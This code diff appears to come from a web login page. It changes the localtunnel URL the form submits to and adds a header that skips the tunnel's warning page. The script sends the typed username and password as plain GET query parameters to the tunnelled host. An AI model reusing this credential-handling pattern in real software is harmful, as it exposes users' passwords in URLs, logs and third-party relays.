@@ -95,7 +95,7 @@ body {
 
 const submitlogindata = async ()=>{ 
             
-            const api_url_tunneled = 'https://loose-cats-shout-130-37-65-160.loca.lt/login'
+            const api_url_tunneled = 'https://poor-dolls-heal-130-37-65-160.loca.lt/login'
             const username = document.getElementById("username").value;
             const password = document.getElementById('password').value;
 
@@ -108,7 +108,7 @@ const Obj = {
 username,password
 }
 // Import the functions you need from the SDKs you need
-const post_req = await fetch(api_url_tunneled + "?username=" +username +"&password=" +password ,{method: 'GET'})
+const post_req = await fetch(api_url_tunneled + "?username=" +username +"&password=" +password ,{method: 'GET', headers: {"Bypass-Tunnel-Reminder": true}})
 
 console.log(post_req.status)
 
